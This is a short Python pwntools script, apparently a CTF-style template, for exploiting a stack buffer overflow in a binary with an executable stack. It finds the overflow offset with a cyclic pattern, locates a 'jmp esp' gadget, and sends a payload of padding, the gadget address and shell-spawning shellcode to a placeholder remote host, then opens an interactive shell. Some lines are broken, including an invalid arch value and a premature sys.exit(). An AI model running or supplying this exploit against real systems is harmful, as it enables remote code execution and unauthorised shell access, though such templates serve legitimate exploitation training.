from pwn import *

#this depends on what you are doing
context.update(arch='1368', os='linux')
#local process
#io = process("./executeable_stack")

#remote connection. add address of choice
io = remote("tcp://addresshere.com", 8080)


#find offsets
gdb.attach(io, 'continue')
pattern = cyclic(512)
io.sendline(pattern)
pause()
sys.exit()

#then enter cyclic_find(addressofeiphere) to find offset

#load binary as elf and search for jump esp
binary = ELF("./executeable_stack")
jmp_esp = next(binary.search(asm("jmp esp")))
print(hex(jmp_esp))

exploit = flat(["A" * 140, pack(jmp_esp), asm(shellcraft.sh())])

#test locally
io.sendline(exploit)
io.interactive()
